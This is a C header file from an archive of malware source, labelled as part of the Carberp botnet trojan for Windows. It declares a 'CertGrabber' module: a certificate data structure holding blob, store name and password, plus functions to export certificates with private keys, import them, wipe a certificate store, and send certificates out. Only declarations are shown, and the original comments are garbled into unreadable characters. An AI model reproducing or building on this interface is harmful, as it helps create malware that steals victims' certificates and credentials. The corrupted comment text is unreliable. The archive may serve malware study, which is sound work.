/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#ifndef CertGrabH
#define CertGrabH
//---------------------------------------------------------------------------
#include <windows.h>

typedef struct TCertData
{
	CRYPT_DATA_BLOB Blob; // ����������
	PCHAR Name;           // ��� ���������
	PWCHAR Password;       // ������ ���������� �������������� ������������
	int Count;             // ���������� ������������ � ���������
} *PCertData;


namespace CertGrabber
{
	// �������������� ������� ��������� ������������
	void Initialize();

	// ������������ ��� ������������������ �����������
	bool Export(PCertData Data);

	// ������������� ����������� � ���������
	bool Import(PCertData Data);

	// �������� ��������� ������������
	void ClearCertStore(PCHAR Name);

	// ��������� �����������
	bool SendCert(PCertData Data);
}


//---------------------------------------------------------------------------
#endif
